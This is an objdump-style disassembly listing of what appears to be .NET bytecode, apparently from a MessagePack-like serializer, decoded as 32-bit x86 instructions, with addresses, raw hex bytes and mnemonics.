  4046e7:	bc 00 00 0a 13       	mov    $0x130a0000,%esp
  4046ec:	04 06                	add    $0x6,%al
  4046ee:	17                   	pop    %ss
  4046ef:	58                   	pop    %eax
  4046f0:	0a 08                	or     (%eax),%cl
  4046f2:	11 04 7b             	adc    %eax,(%ebx,%edi,2)
  4046f5:	34 00                	xor    $0x0,%al
  4046f7:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4046fa:	ed                   	in     (%dx),%eax
  4046fb:	00 00                	add    %al,(%eax)
  4046fd:	0a 39                	or     (%ecx),%bh
  4046ff:	07                   	pop    %es
  404700:	00 00                	add    %al,(%eax)
  404702:	00 06                	add    %al,(%esi)
  404704:	0b dd                	or     %ebp,%ebx
  404706:	1c 00                	sbb    $0x0,%al
  404708:	00 00                	add    %al,(%eax)
  40470a:	12 03                	adc    (%ebx),%al
  40470c:	28 be 00 00 0a 2d    	sub    %bh,0x2d0a0000(%esi)
  404712:	d1 dd                	rcr    $1,%ebp
  404714:	0e                   	push   %cs
  404715:	00 00                	add    %al,(%eax)
  404717:	00 12                	add    %dl,(%edx)
  404719:	03 fe                	add    %esi,%edi
  40471b:	16                   	push   %ss
  40471c:	04 00                	add    $0x0,%al
  40471e:	00 1b                	add    %bl,(%ebx)
  404720:	6f                   	outsl  %ds:(%esi),(%dx)
  404721:	33 00                	xor    (%eax),%eax
  404723:	00 0a                	add    %cl,(%edx)
  404725:	dc 07                	faddl  (%edi)
  404727:	2a 01                	sub    (%ecx),%al
  404729:	10 00                	adc    %al,(%eax)
  40472b:	00 02                	add    %al,(%edx)
  40472d:	00 17                	add    %dl,(%edi)
  40472f:	00 39                	add    %bh,(%ecx)
  404731:	50                   	push   %eax
  404732:	00 0e                	add    %cl,(%esi)
  404734:	00 00                	add    %al,(%eax)
  404736:	00 00                	add    %al,(%eax)
  404738:	13 30                	adc    (%eax),%esi
  40473a:	02 00                	add    (%eax),%al
  40473c:	1e                   	push   %ds
  40473d:	00 00                	add    %al,(%eax)
  40473f:	00 01                	add    %al,(%ecx)
  404741:	00 00                	add    %al,(%eax)
  404743:	11 02                	adc    %eax,(%edx)
  404745:	03 28                	add    (%eax),%ebp
  404747:	6d                   	insl   (%dx),%es:(%edi)
  404748:	00 00                	add    %al,(%eax)
  40474a:	06                   	push   %es
  40474b:	0a 06                	or     (%esi),%al
  40474d:	15 40 02 00 00       	adc    $0x240,%eax
  404752:	00 14 2a             	add    %dl,(%edx,%ebp,1)
  404755:	02 7b 38             	add    0x38(%ebx),%bh
  404758:	00 00                	add    %al,(%eax)
  40475a:	04 06                	add    $0x6,%al
  40475c:	6f                   	outsl  %ds:(%esi),(%dx)
  40475d:	ea 00 00 0a 2a 00 00 	ljmp   $0x0,$0x2a0a0000
  404764:	13 30                	adc    (%eax),%esi
  404766:	04 00                	add    $0x0,%al
  404768:	bc 00 00 00 1f       	mov    $0x1f000000,%esp
  40476d:	00 00                	add    %al,(%eax)
  40476f:	11 02                	adc    %eax,(%edx)
  404771:	7b 38                	jnp    0x4047ab
  404773:	00 00                	add    %al,(%eax)
  404775:	04 6f                	add    $0x6f,%al
  404777:	eb 00                	jmp    0x404779
  404779:	00 0a                	add    %cl,(%edx)
  40477b:	0a 06                	or     (%esi),%al
  40477d:	1f                   	pop    %ds
  40477e:	0f 3d                	(bad)
  404780:	16                   	push   %ss
  404781:	00 00                	add    %al,(%eax)
  404783:	00 20                	add    %ah,(%eax)
  404785:	80 00 00             	addb   $0x0,(%eax)
  404788:	00 06                	add    %al,(%esi)
  40478a:	d2 58 d2             	rcrb   %cl,-0x2e(%eax)
  40478d:	0b 03                	or     (%ebx),%eax
  40478f:	07                   	pop    %es
  404790:	6f                   	outsl  %ds:(%esi),(%dx)
  404791:	ee                   	out    %al,(%dx)
  404792:	00 00                	add    %al,(%eax)
  404794:	0a 38                	or     (%eax),%bh
  404796:	59                   	pop    %ecx
  404797:	00 00                	add    %al,(%eax)
  404799:	00 06                	add    %al,(%esi)
  40479b:	20 ff                	and    %bh,%bh
  40479d:	ff 00                	incl   (%eax)
  40479f:	00 3d 2a 00 00 00    	add    %bh,0x2a
  4047a5:	20 de                	and    %bl,%dh
  4047a7:	00 00                	add    %al,(%eax)
  4047a9:	00 0b                	add    %cl,(%ebx)
  4047ab:	03 07                	add    (%edi),%eax
  4047ad:	6f                   	outsl  %ds:(%esi),(%dx)
  4047ae:	ee                   	out    %al,(%dx)
  4047af:	00 00                	add    %al,(%eax)
  4047b1:	0a 06                	or     (%esi),%al
  4047b3:	68 28 ef 00 00       	push   $0xef28
  4047b8:	0a 28                	or     (%eax),%ch
  4047ba:	58                   	pop    %eax
  4047bb:	00 00                	add    %al,(%eax)
  4047bd:	06                   	push   %es
  4047be:	0c 03                	or     $0x3,%al
  4047c0:	08 16                	or     %dl,(%esi)
  4047c2:	08 8e 69 6f 4c 00    	or     %cl,0x4c6f69(%esi)
  4047c8:	00 0a                	add    %cl,(%edx)
  4047ca:	38 24 00             	cmp    %ah,(%eax,%eax,1)
  4047cd:	00 00                	add    %al,(%eax)
  4047cf:	20 df                	and    %bl,%bh
  4047d1:	00 00                	add    %al,(%eax)
  4047d3:	00 0b                	add    %cl,(%ebx)
  4047d5:	03 07                	add    (%edi),%eax
  4047d7:	6f                   	outsl  %ds:(%esi),(%dx)
  4047d8:	ee                   	out    %al,(%dx)
  4047d9:	00 00                	add    %al,(%eax)
  4047db:	0a 06                	or     (%esi),%al
  4047dd:	28 4a 00             	sub    %cl,0x0(%edx)
  4047e0:	00 0a                	add    %cl,(%edx)
  4047e2:	28 58 00             	sub    %bl,0x0(%eax)
  4047e5:	00 06                	add    %al,(%esi)
  4047e7:	0c 03                	or     $0x3,%al
  4047e9:	08 16                	or     %dl,(%esi)
  4047eb:	08 8e 69 6f 4c 00    	or     %cl,0x4c6f69(%esi)
  4047f1:	00 0a                	add    %cl,(%edx)
  4047f3:	16                   	push   %ss
  4047f4:	0d 38 2d 00 00       	or     $0x2d38,%eax
  4047f9:	00 03                	add    %al,(%ebx)
  4047fb:	02 7b 38             	add    0x38(%ebx),%bh
  4047fe:	00 00                	add    %al,(%eax)
  404800:	04 09                	add    $0x9,%al
  404802:	6f                   	outsl  %ds:(%esi),(%dx)
  404803:	ea 00 00 0a 7b 33 00 	ljmp   $0x33,$0x7b0a0000
  40480a:	00 04 28             	add    %al,(%eax,%ebp,1)
  40480d:	9a 00 00 06 02 7b 38 	lcall  $0x387b,$0x2060000
  404814:	00 00                	add    %al,(%eax)
  404816:	04 09                	add    $0x9,%al
  404818:	6f                   	outsl  %ds:(%esi),(%dx)
  404819:	ea 00 00 0a 03 6f 8a 	ljmp   $0x8a6f,$0x30a0000
  404820:	00 00                	add    %al,(%eax)
  404822:	06                   	push   %es
  404823:	09 17                	or     %edx,(%edi)
  404825:	58                   	pop    %eax
  404826:	0d 09 06 32 cf       	or     $0xcf320609,%eax
  40482b:	2a 13                	sub    (%ebx),%dl
  40482d:	30 04 00             	xor    %al,(%eax,%eax,1)
  404830:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  404831:	00 00                	add    %al,(%eax)
  404833:	00 1f                	add    %bl,(%edi)
  404835:	00 00                	add    %al,(%eax)
  404837:	11 02                	adc    %eax,(%edx)
  404839:	7b 38                	jnp    0x404873
  40483b:	00 00                	add    %al,(%eax)
  40483d:	04 6f                	add    $0x6f,%al
  40483f:	eb 00                	jmp    0x404841
  404841:	00 0a                	add    %cl,(%edx)
  404843:	0a 06                	or     (%esi),%al
  404845:	1f                   	pop    %ds
  404846:	0f 3d                	(bad)
  404848:	16                   	push   %ss
  404849:	00 00                	add    %al,(%eax)
  40484b:	00 20                	add    %ah,(%eax)
  40484d:	90                   	nop
  40484e:	00 00                	add    %al,(%eax)
  404850:	00 06                	add    %al,(%esi)
  404852:	d2 58 d2             	rcrb   %cl,-0x2e(%eax)
  404855:	0b 03                	or     (%ebx),%eax
  404857:	07                   	pop    %es
  404858:	6f                   	outsl  %ds:(%esi),(%dx)
  404859:	ee                   	out    %al,(%dx)
  40485a:	00 00                	add    %al,(%eax)
  40485c:	0a 38                	or     (%eax),%bh
  40485e:	59                   	pop    %ecx
  40485f:	00 00                	add    %al,(%eax)
  404861:	00 06                	add    %al,(%esi)
  404863:	20 ff                	and    %bh,%bh
  404865:	ff 00                	incl   (%eax)
  404867:	00 3d 2a 00 00 00    	add    %bh,0x2a
  40486d:	20 dc                	and    %bl,%ah
  40486f:	00 00                	add    %al,(%eax)
  404871:	00 0b                	add    %cl,(%ebx)
  404873:	03 07                	add    (%edi),%eax
  404875:	6f                   	outsl  %ds:(%esi),(%dx)
  404876:	ee                   	out    %al,(%dx)
  404877:	00 00                	add    %al,(%eax)
  404879:	0a 06                	or     (%esi),%al
  40487b:	68 28 ef 00 00       	push   $0xef28
  404880:	0a 28                	or     (%eax),%ch
  404882:	58                   	pop    %eax
  404883:	00 00                	add    %al,(%eax)
  404885:	06                   	push   %es
  404886:	0c 03                	or     $0x3,%al
  404888:	08 16                	or     %dl,(%esi)
  40488a:	08 8e 69 6f 4c 00    	or     %cl,0x4c6f69(%esi)
  404890:	00 0a                	add    %cl,(%edx)
  404892:	38 24 00             	cmp    %ah,(%eax,%eax,1)
  404895:	00 00                	add    %al,(%eax)
  404897:	20 dd                	and    %bl,%ch
  404899:	00 00                	add    %al,(%eax)
  40489b:	00 0b                	add    %cl,(%ebx)
  40489d:	03 07                	add    (%edi),%eax
  40489f:	6f                   	outsl  %ds:(%esi),(%dx)
  4048a0:	ee                   	out    %al,(%dx)
  4048a1:	00 00                	add    %al,(%eax)
  4048a3:	0a 06                	or     (%esi),%al
  4048a5:	28 4a 00             	sub    %cl,0x0(%edx)
  4048a8:	00 0a                	add    %cl,(%edx)
  4048aa:	28 58 00             	sub    %bl,0x0(%eax)
  4048ad:	00 06                	add    %al,(%esi)
  4048af:	0c 03                	or     $0x3,%al
  4048b1:	08 16                	or     %dl,(%esi)
  4048b3:	08 8e 69 6f 4c 00    	or     %cl,0x4c6f69(%esi)
  4048b9:	00 0a                	add    %cl,(%edx)
  4048bb:	16                   	push   %ss
  4048bc:	0d 38 16 00 00       	or     $0x1638,%eax
  4048c1:	00 02                	add    %al,(%edx)
  4048c3:	7b 38                	jnp    0x4048fd
  4048c5:	00 00                	add    %al,(%eax)
  4048c7:	04 09                	add    $0x9,%al
  4048c9:	6f                   	outsl  %ds:(%esi),(%dx)
  4048ca:	ea 00 00 0a 03 6f 8a 	ljmp   $0x8a6f,$0x30a0000
  4048d1:	00 00                	add    %al,(%eax)
  4048d3:	06                   	push   %es
  4048d4:	09 17                	or     %edx,(%edi)
  4048d6:	58                   	pop    %eax
  4048d7:	0d 09 06 32 e6       	or     $0xe6320609,%eax
  4048dc:	2a 00                	sub    (%eax),%al
  4048de:	00 00                	add    %al,(%eax)
  4048e0:	13 30                	adc    (%eax),%esi
  4048e2:	02 00                	add    (%eax),%al
  4048e4:	99                   	cltd
  4048e5:	00 00                	add    %al,(%eax)
  4048e7:	00 20                	add    %ah,(%eax)
  4048e9:	00 00                	add    %al,(%eax)
  4048eb:	11 02                	adc    %eax,(%edx)
  4048ed:	7b 36                	jnp    0x404925
  4048ef:	00 00                	add    %al,(%eax)
  4048f1:	04 0a                	add    $0xa,%al
  4048f3:	06                   	push   %es
  4048f4:	1a 59 45             	sbb    0x45(%ecx),%bl
  4048f7:	07                   	pop    %es
  4048f8:	00 00                	add    %al,(%eax)
  4048fa:	00 22                	add    %ah,(%edx)
  4048fc:	00 00                	add    %al,(%eax)
  4048fe:	00 05 00 00 00 16    	add    %al,0x16000000
  404904:	00 00                	add    %al,(%eax)
  404906:	00 6b 00             	add    %ch,0x0(%ebx)
  404909:	00 00                	add    %al,(%eax)
  40490b:	38 00                	cmp    %al,(%eax)
  40490d:	00 00                	add    %al,(%eax)
  40490f:	49                   	dec    %ecx
  404910:	00 00                	add    %al,(%eax)
  404912:	00 5a 00             	add    %bl,0x0(%edx)
  404915:	00 00                	add    %al,(%eax)
  404917:	38 66 00             	cmp    %ah,0x0(%esi)
  40491a:	00 00                	add    %al,(%eax)
  40491c:	02 7b 35             	add    0x35(%ebx),%bh
  40491f:	00 00                	add    %al,(%eax)
  404921:	04 a5                	add    $0xa5,%al
  404923:	68 00 00 01 28       	push   $0x28010000
  404928:	f0 00 00             	lock add %al,(%eax)
  40492b:	0a 2a                	or     (%edx),%ch
  40492d:	02 7b 35             	add    0x35(%ebx),%bh
  404930:	00 00                	add    %al,(%eax)
  404932:	04 a5                	add    $0xa5,%al
  404934:	95                   	xchg   %eax,%ebp
  404935:	00 00                	add    %al,(%eax)
  404937:	01 2a                	add    %ebp,(%edx)
  404939:	02 7b 35             	add    0x35(%ebx),%bh
  40493c:	00 00                	add    %al,(%eax)
  40493e:	04 6f                	add    $0x6f,%al
  404940:	38 00                	cmp    %al,(%eax)
  404942:	00 0a                	add    %cl,(%edx)
  404944:	6f                   	outsl  %ds:(%esi),(%dx)
  404945:	f1                   	int1
  404946:	00 00                	add    %al,(%eax)
  404948:	0a 28                	or     (%eax),%ch
  40494a:	f2 00 00             	repnz add %al,(%eax)
  40494d:	0a 2a                	or     (%edx),%ch
  40494f:	02 7b 35             	add    0x35(%ebx),%bh
  404952:	00 00                	add    %al,(%eax)
  404954:	04 a5                	add    $0xa5,%al
  404956:	96                   	xchg   %eax,%esi
  404957:	00 00                	add    %al,(%eax)
  404959:	01 28                	add    %ebp,(%eax)
  40495b:	f3 00 00             	repz add %al,(%eax)
  40495e:	0a 2a                	or     (%edx),%ch
  404960:	02 7b 35             	add    0x35(%ebx),%bh
  404963:	00 00                	add    %al,(%eax)
  404965:	04 a5                	add    $0xa5,%al
  404967:	97                   	xchg   %eax,%edi
  404968:	00 00                	add    %al,(%eax)
  40496a:	01 28                	add    %ebp,(%eax)
  40496c:	f4                   	hlt
  40496d:	00 00                	add    %al,(%eax)
  40496f:	0a 2a                	or     (%edx),%ch
  404971:	02 7b 35             	add    0x35(%ebx),%bh
  404974:	00 00                	add    %al,(%eax)
  404976:	04 a5                	add    $0xa5,%al
  404978:	6b 00 00             	imul   $0x0,(%eax),%eax
  40497b:	01 28                	add    %ebp,(%eax)
  40497d:	f5                   	cmc
  40497e:	00 00                	add    %al,(%eax)
  404980:	0a 2a                	or     (%edx),%ch
  404982:	16                   	push   %ss
  404983:	6a 2a                	push   $0x2a
  404985:	00 00                	add    %al,(%eax)
  404987:	00 13                	add    %dl,(%ebx)
  404989:	30 02                	xor    %al,(%edx)
  40498b:	00 99 00 00 00 20    	add    %bl,0x20000000(%ecx)
  404991:	00 00                	add    %al,(%eax)
  404993:	11 02                	adc    %eax,(%edx)
  404995:	7b 36                	jnp    0x4049cd
  404997:	00 00                	add    %al,(%eax)
  404999:	04 0a                	add    $0xa,%al
  40499b:	06                   	push   %es
  40499c:	1a 59 45             	sbb    0x45(%ecx),%bl
  40499f:	07                   	pop    %es
  4049a0:	00 00                	add    %al,(%eax)
  4049a2:	00 22                	add    %ah,(%edx)
  4049a4:	00 00                	add    %al,(%eax)
  4049a6:	00 05 00 00 00 11    	add    %al,0x11000000
  4049ac:	00 00                	add    %al,(%eax)
  4049ae:	00 6b 00             	add    %ch,0x0(%ebx)
  4049b1:	00 00                	add    %al,(%eax)
  4049b3:	38 00                	cmp    %al,(%eax)
  4049b5:	00 00                	add    %al,(%eax)
  4049b7:	49                   	dec    %ecx
  4049b8:	00 00                	add    %al,(%eax)
  4049ba:	00 5a 00             	add    %bl,0x0(%edx)
  4049bd:	00 00                	add    %al,(%eax)
  4049bf:	38 66 00             	cmp    %ah,0x0(%esi)
  4049c2:	00 00                	add    %al,(%eax)
  4049c4:	02 7b 35             	add    0x35(%ebx),%bh
  4049c7:	00 00                	add    %al,(%eax)
  4049c9:	04 a5                	add    $0xa5,%al
  4049cb:	68 00 00 01 2a       	push   $0x2a010000
  4049d0:	02 7b 35             	add    0x35(%ebx),%bh
  4049d3:	00 00                	add    %al,(%eax)
  4049d5:	04 a5                	add    $0xa5,%al
  4049d7:	68 00 00 01 28       	push   $0x28010000
  4049dc:	f6 00 00             	testb  $0x0,(%eax)
  4049df:	0a 2a                	or     (%edx),%ch
  4049e1:	02 7b 35             	add    0x35(%ebx),%bh
  4049e4:	00 00                	add    %al,(%eax)
  4049e6:	04 6f                	add    $0x6f,%al
  4049e8:	38 00                	cmp    %al,(%eax)
  4049ea:	00 0a                	add    %cl,(%edx)
  4049ec:	6f                   	outsl  %ds:(%esi),(%dx)
  4049ed:	f1                   	int1
  4049ee:	00 00                	add    %al,(%eax)
  4049f0:	0a 28                	or     (%eax),%ch
  4049f2:	f7 00 00 0a 2a 02    	testl  $0x22a0a00,(%eax)
  4049f8:	7b 35                	jnp    0x404a2f
  4049fa:	00 00                	add    %al,(%eax)
  4049fc:	04 a5                	add    $0xa5,%al
  4049fe:	96                   	xchg   %eax,%esi
  4049ff:	00 00                	add    %al,(%eax)
  404a01:	01 28                	add    %ebp,(%eax)
  404a03:	f8                   	clc
  404a04:	00 00                	add    %al,(%eax)
  404a06:	0a 2a                	or     (%edx),%ch
  404a08:	02 7b 35             	add    0x35(%ebx),%bh
  404a0b:	00 00                	add    %al,(%eax)
  404a0d:	04 a5                	add    $0xa5,%al
  404a0f:	97                   	xchg   %eax,%edi
  404a10:	00 00                	add    %al,(%eax)
  404a12:	01 28                	add    %ebp,(%eax)
  404a14:	f9                   	stc
  404a15:	00 00                	add    %al,(%eax)
  404a17:	0a 2a                	or     (%edx),%ch
  404a19:	02 7b 35             	add    0x35(%ebx),%bh
  404a1c:	00 00                	add    %al,(%eax)
  404a1e:	04 a5                	add    $0xa5,%al
  404a20:	6b 00 00             	imul   $0x0,(%eax),%eax
  404a23:	01 28                	add    %ebp,(%eax)
  404a25:	fa                   	cli
  404a26:	00 00                	add    %al,(%eax)
  404a28:	0a 2a                	or     (%edx),%ch
  404a2a:	16                   	push   %ss
  404a2b:	6a 2a                	push   $0x2a
  404a2d:	00 00                	add    %al,(%eax)
  404a2f:	00 13                	add    %dl,(%ebx)
  404a31:	30 02                	xor    %al,(%edx)
  404a33:	00 87 00 00 00 20    	add    %al,0x20000000(%edi)
  404a39:	00 00                	add    %al,(%eax)
  404a3b:	11 02                	adc    %eax,(%edx)
  404a3d:	7b 36                	jnp    0x404a75
  404a3f:	00 00                	add    %al,(%eax)
  404a41:	04 0a                	add    $0xa,%al
  404a43:	06                   	push   %es
  404a44:	1a 59 45             	sbb    0x45(%ecx),%bl
  404a47:	07                   	pop    %es
  404a48:	00 00                	add    %al,(%eax)
  404a4a:	00 16                	add    %dl,(%esi)
  404a4c:	00 00                	add    %al,(%eax)
  404a4e:	00 05 00 00 00 52    	add    %al,0x52000000
  404a54:	00 00                	add    %al,(%eax)
  404a56:	00 52 00             	add    %dl,0x0(%edx)
  404a59:	00 00                	add    %al,(%eax)
  404a5b:	27                   	daa
  404a5c:	00 00                	add    %al,(%eax)
  404a5e:	00 33                	add    %dh,(%ebx)
  404a60:	00 00                	add    %al,(%eax)
  404a62:	00 40 00             	add    %al,0x0(%eax)
  404a65:	00 00                	add    %al,(%eax)
  404a67:	38 4d 00             	cmp    %cl,0x0(%ebp)
  404a6a:	00 00                	add    %al,(%eax)
  404a6c:	02 7b 35             	add    0x35(%ebx),%bh
  404a6f:	00 00                	add    %al,(%eax)
  404a71:	04 a5                	add    $0xa5,%al
  404a73:	68 00 00 01 28       	push   $0x28010000
  404a78:	fb                   	sti
  404a79:	00 00                	add    %al,(%eax)
  404a7b:	0a 2a                	or     (%edx),%ch
  404a7d:	02 7b 35             	add    0x35(%ebx),%bh
  404a80:	00 00                	add    %al,(%eax)
  404a82:	04 74                	add    $0x74,%al
  404a84:	38 00                	cmp    %al,(%eax)
  404a86:	00 01                	add    %al,(%ecx)
  404a88:	28 fc                	sub    %bh,%ah
  404a8a:	00 00                	add    %al,(%eax)
  404a8c:	0a 2a                	or     (%edx),%ch
  404a8e:	02 7b 35             	add    0x35(%ebx),%bh
  404a91:	00 00                	add    %al,(%eax)
  404a93:	04 a5                	add    $0xa5,%al
  404a95:	96                   	xchg   %eax,%esi
  404a96:	00 00                	add    %al,(%eax)
  404a98:	01 2a                	add    %ebp,(%edx)
  404a9a:	02 7b 35             	add    0x35(%ebx),%bh
  404a9d:	00 00                	add    %al,(%eax)
  404a9f:	04 a5                	add    $0xa5,%al
  404aa1:	97                   	xchg   %eax,%edi
  404aa2:	00 00                	add    %al,(%eax)
  404aa4:	01 6c 2a 02          	add    %ebp,0x2(%edx,%ebp,1)
  404aa8:	7b 35                	jnp    0x404adf
  404aaa:	00 00                	add    %al,(%eax)
  404aac:	04 a5                	add    $0xa5,%al
  404aae:	6b 00 00             	imul   $0x0,(%eax),%eax
  404ab1:	01 28                	add    %ebp,(%eax)
  404ab3:	fa                   	cli
  404ab4:	00 00                	add    %al,(%eax)
  404ab6:	0a 6c 2a 23          	or     0x23(%edx,%ebp,1),%ch
	...
  404ac2:	2a 00                	sub    (%eax),%al
  404ac4:	13 30                	adc    (%eax),%esi
  404ac6:	02 00                	add    (%eax),%al
  404ac8:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  404ac9:	00 00                	add    %al,(%eax)
  404acb:	00 21                	add    %ah,(%ecx)
  404acd:	00 00                	add    %al,(%eax)
  404acf:	11 02                	adc    %eax,(%edx)
  404ad1:	7b 36                	jnp    0x404b09
  404ad3:	00 00                	add    %al,(%eax)
  404ad5:	04 0a                	add    $0xa,%al
  404ad7:	06                   	push   %es
  404ad8:	1a 59 45             	sbb    0x45(%ecx),%bl
  404adb:	08 00                	or     %al,(%eax)
  404add:	00 00                	add    %al,(%eax)
  404adf:	16                   	push   %ss
  404ae0:	00 00                	add    %al,(%eax)
  404ae2:	00 05 00 00 00 6e    	add    %al,0x6e000000
  404ae8:	00 00                	add    %al,(%eax)
  404aea:	00 6e 00             	add    %ch,0x0(%esi)
  404aed:	00 00                	add    %al,(%eax)
  404aef:	27                   	daa
  404af0:	00 00                	add    %al,(%eax)
  404af2:	00 38                	add    %bh,(%eax)
  404af4:	00 00                	add    %al,(%eax)
  404af6:	00 49 00             	add    %cl,0x0(%ecx)
  404af9:	00 00                	add    %al,(%eax)
  404afb:	62 00                	bound  %eax,(%eax)
  404afd:	00 00                	add    %al,(%eax)
  404aff:	38 69 00             	cmp    %ch,0x0(%ecx)
  404b02:	00 00                	add    %al,(%eax)
  404b04:	02 7b 35             	add    0x35(%ebx),%bh
  404b07:	00 00                	add    %al,(%eax)
  404b09:	04 a5                	add    $0xa5,%al
  404b0b:	68 00 00 01 28       	push   $0x28010000
  404b10:	e7 00                	out    %eax,$0x0
  404b12:	00 0a                	add    %cl,(%edx)
  404b14:	2a 02                	sub    (%edx),%al
  404b16:	7b 35                	jnp    0x404b4d
  404b18:	00 00                	add    %al,(%eax)
  404b1a:	04 6f                	add    $0x6f,%al
  404b1c:	38 00                	cmp    %al,(%eax)
  404b1e:	00 0a                	add    %cl,(%edx)
  404b20:	28 54 00 00          	sub    %dl,0x0(%eax,%eax,1)
  404b24:	06                   	push   %es
  404b25:	2a 02                	sub    (%edx),%al
  404b27:	7b 35                	jnp    0x404b5e
  404b29:	00 00                	add    %al,(%eax)
  404b2b:	04 a5                	add    $0xa5,%al
  404b2d:	96                   	xchg   %eax,%esi
  404b2e:	00 00                	add    %al,(%eax)
  404b30:	01 28                	add    %ebp,(%eax)
  404b32:	e8 00 00 0a 2a       	call   0x2a4a4b37
  404b37:	02 7b 35             	add    0x35(%ebx),%bh
  404b3a:	00 00                	add    %al,(%eax)
  404b3c:	04 a5                	add    $0xa5,%al
  404b3e:	97                   	xchg   %eax,%edi
  404b3f:	00 00                	add    %al,(%eax)
  404b41:	01 28                	add    %ebp,(%eax)
  404b43:	fd                   	std
  404b44:	00 00                	add    %al,(%eax)
  404b46:	0a 2a                	or     (%edx),%ch
  404b48:	02 7b 35             	add    0x35(%ebx),%bh
  404b4b:	00 00                	add    %al,(%eax)
  404b4d:	04 a5                	add    $0xa5,%al
  404b4f:	6b 00 00             	imul   $0x0,(%eax),%eax
  404b52:	01 0b                	add    %ecx,(%ebx)
  404b54:	12 01                	adc    (%ecx),%al
  404b56:	28 fe                	sub    %bh,%dh
  404b58:	00 00                	add    %al,(%eax)
  404b5a:	0a 28                	or     (%eax),%ch
  404b5c:	e7 00                	out    %eax,$0x0
  404b5e:	00 0a                	add    %cl,(%edx)
  404b60:	2a 02                	sub    (%edx),%al
  404b62:	7b 35                	jnp    0x404b99
  404b64:	00 00                	add    %al,(%eax)
  404b66:	04 74                	add    $0x74,%al
  404b68:	02 00                	add    (%eax),%al
  404b6a:	00 1b                	add    %bl,(%ebx)
  404b6c:	2a 16                	sub    (%esi),%dl
  404b6e:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404b72:	01 2a                	add    %ebp,(%edx)
  404b74:	13 30                	adc    (%eax),%esi
  404b76:	04 00                	add    $0x0,%al
  404b78:	4b                   	dec    %ebx
  404b79:	00 00                	add    %al,(%eax)
  404b7b:	00 22                	add    %ah,(%edx)
  404b7d:	00 00                	add    %al,(%eax)
  404b7f:	11 03                	adc    %eax,(%ebx)
  404b81:	28 6a 00             	sub    %ch,0x0(%edx)
  404b84:	00 0a                	add    %cl,(%edx)
  404b86:	39 3e                	cmp    %edi,(%esi)
  404b88:	00 00                	add    %al,(%eax)
  404b8a:	00 14 0a             	add    %dl,(%edx,%ecx,1)
  404b8d:	03 19                	add    (%ecx),%ebx
  404b8f:	17                   	pop    %ss
  404b90:	17                   	pop    %ss
  404b91:	73 ff                	jae    0x404b92
  404b93:	00 00                	add    %al,(%eax)
  404b95:	0a 0b                	or     (%ebx),%cl
  404b97:	07                   	pop    %es
  404b98:	6f                   	outsl  %ds:(%esi),(%dx)
  404b99:	e2 00                	loop   0x404b9b
  404b9b:	00 0a                	add    %cl,(%edx)
  404b9d:	d4 8d                	aam    $0x8d
  404b9f:	44                   	inc    %esp
  404ba0:	00 00                	add    %al,(%eax)
  404ba2:	01 0a                	add    %ecx,(%edx)
  404ba4:	07                   	pop    %es
  404ba5:	06                   	push   %es
  404ba6:	16                   	push   %ss
  404ba7:	07                   	pop    %es
  404ba8:	6f                   	outsl  %ds:(%esi),(%dx)
  404ba9:	e2 00                	loop   0x404bab
  404bab:	00 0a                	add    %cl,(%edx)
  404bad:	69 6f 45 00 00 0a 26 	imul   $0x260a0000,0x45(%edi),%ebp
  404bb4:	07                   	pop    %es
  404bb5:	6f                   	outsl  %ds:(%esi),(%dx)
  404bb6:	9f                   	lahf
  404bb7:	00 00                	add    %al,(%eax)
  404bb9:	0a 07                	or     (%edi),%al
  404bbb:	6f                   	outsl  %ds:(%esi),(%dx)
  404bbc:	40                   	inc    %eax
  404bbd:	00 00                	add    %al,(%eax)
  404bbf:	0a 02                	or     (%edx),%al
  404bc1:	06                   	push   %es
  404bc2:	28 79 00             	sub    %bh,0x0(%ecx)
  404bc5:	00 06                	add    %al,(%esi)
  404bc7:	17                   	pop    %ss
  404bc8:	2a 16                	sub    (%esi),%dl
  404bca:	2a 00                	sub    (%eax),%al
  404bcc:	13 30                	adc    (%eax),%esi
  404bce:	05 00 40 00 00       	add    $0x4000,%eax
  404bd3:	00 00                	add    %al,(%eax)
  404bd5:	00 00                	add    %al,(%eax)
  404bd7:	00 02                	add    %al,(%edx)
  404bd9:	7b 35                	jnp    0x404c10
  404bdb:	00 00                	add    %al,(%eax)
  404bdd:	04 39                	add    $0x39,%al
  404bdf:	33 00                	xor    (%eax),%eax
  404be1:	00 00                	add    %al,(%eax)
  404be3:	03 1c 73             	add    (%ebx,%esi,2),%ebx
  404be6:	6c                   	insb   (%dx),%es:(%edi)
  404be7:	00 00                	add    %al,(%eax)
  404be9:	0a 25 02 7b 35 00    	or     0x357b02,%ah
  404bef:	00 04 74             	add    %al,(%esp,%esi,2)
  404bf2:	02 00                	add    (%eax),%al
  404bf4:	00 1b                	add    %bl,(%ebx)
  404bf6:	16                   	push   %ss
  404bf7:	02 7b 35             	add    0x35(%ebx),%bh
  404bfa:	00 00                	add    %al,(%eax)
  404bfc:	04 74                	add    $0x74,%al
  404bfe:	02 00                	add    (%eax),%al
  404c00:	00 1b                	add    %bl,(%ebx)
  404c02:	8e 69 6f             	mov    0x6f(%ecx),%gs
  404c05:	4c                   	dec    %esp
  404c06:	00 00                	add    %al,(%eax)
  404c08:	0a 25 6f 9f 00 00    	or     0x9f6f,%ah
  404c0e:	0a 6f 40             	or     0x40(%edi),%ch
  404c11:	00 00                	add    %al,(%eax)
  404c13:	0a 17                	or     (%edi),%dl
  404c15:	2a 16                	sub    (%esi),%dl
  404c17:	2a 13                	sub    (%ebx),%dl
  404c19:	30 04 00             	xor    %al,(%eax,%eax,1)
  404c1c:	af                   	scas   %es:(%edi),%eax
  404c1d:	00 00                	add    %al,(%eax)
  404c1f:	00 23                	add    %ah,(%ebx)
  404c21:	00 00                	add    %al,(%eax)
  404c23:	11 02                	adc    %eax,(%edx)
  404c25:	0a 03                	or     (%ebx),%al
  404c27:	6f                   	outsl  %ds:(%esi),(%dx)
  404c28:	f1                   	int1
  404c29:	00 00                	add    %al,(%eax)
  404c2b:	0a 19                	or     (%ecx),%bl
  404c2d:	8d 39                	lea    (%ecx),%edi
  404c2f:	00 00                	add    %al,(%eax)
  404c31:	01 25 d0 47 00 00    	add    %esp,0x47d0
  404c37:	04 28                	add    $0x28,%al
  404c39:	e4 00                	in     $0x0,%al
  404c3b:	00 0a                	add    %cl,(%edx)
  404c3d:	6f                   	outsl  %ds:(%esi),(%dx)
  404c3e:	26 00 00             	add    %al,%es:(%eax)
  404c41:	0a 0b                	or     (%ebx),%cl
